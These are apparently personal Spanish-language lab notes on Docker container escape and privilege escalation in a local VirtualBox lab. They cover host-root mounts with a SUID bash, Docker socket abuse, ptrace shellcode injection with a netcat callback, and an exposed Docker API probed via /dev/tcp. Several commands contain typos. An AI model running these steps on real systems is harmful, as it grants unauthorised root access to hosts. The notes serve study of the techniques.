ubuntu server 22.04 lts
descargar la iso para montarla en virtualbox

failed unmounted no se que, pero hay que borrar el cd de iso nomas

ssh savitar@192.168.111.41

sudo su
gpasswd -d savitar lxd
apt update
apt install docker.io 

ls -l /var/run/docker.sock
file /var/run/docker.sock
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubuntu
systemctl status docker
docker exec -it ubuntuServer bash

apt install
apt install docker.io
docker images

docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer unumtu
docker exec
apt update
apt install docker.io
docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
docker exec -it privesc bash
cd /mnt/root
cd bin 
chmod u+s bash

chmod u-s bash
docker rm $(docker ps -aq) --force

docker run --rm -dit --pid=host --name ubuntuServer ubuntu
python3 -m http.server 8081

ps -faux

injection shellcode in naming process linux
apt install gcc netcat nano

cd /tmp
nano inject.c
pegar codigo de github y cambiar el tamanio del shell code a 87 y una cadena enorme de caracteres
gcc inject.c -o inject
el pid seria del proceso de python
capsh --print | grep "sys_ptrace"

docker run --rm -dit --pid=host --cap-add=SYS_PTRACE ubServer ubuntu

--privileged

nc 172.17.0.1 5000


portainer
soluciones desplegadas que nos deja crear contenedores con la raiz copiada y blablabla

api de docker
2375 http
2376 https
open port 2375 docker
cd /etc/docker
nano daemon.json
{"hosts": ["tcp":]}
algo mas
systectl daemon-reload
systemctl restart docker.service

netstat -nat
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubunut
docker exec
apt update
apt install curl wget jq

hacktricks
echo '' > /dev/tcp/127.17.0.1/2375
